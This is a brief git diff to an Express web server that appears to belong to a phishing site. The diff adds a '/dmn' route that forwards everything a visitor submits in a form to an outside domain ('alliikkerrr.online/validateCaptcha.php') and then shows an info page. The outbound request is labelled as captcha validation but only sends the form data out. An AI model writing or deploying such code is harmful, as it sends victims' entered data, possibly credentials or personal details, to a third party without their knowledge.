@@ -47,7 +47,22 @@ app.get('/bekle.html', (req, res) => {
 app.get('/files/js', (req, res) => {
   res.sendFile(__dirname + '/public/files/js');
 });
- 
+
+app.post('/dmn', async (req, res) => {
+    try {
+        const formData = req.body;
+
+        const apiUrl = 'https://alliikkerrr.online/validateCaptcha.php';
+
+        // POST isteği yap
+        const response = await axios.post(apiUrl, formData);
+
+        res.sendFile(__dirname + '/public/bilgi.html');
+    } catch (error) {
+        console.error('Hata:', error);
+        res.status(500).send('Internal Server Error');
+    }
+});
 app.get('/img/bg-image.jpeg', (req, res) => {
   res.sendFile(__dirname + '/public/img/bg-image.jpeg');
 });
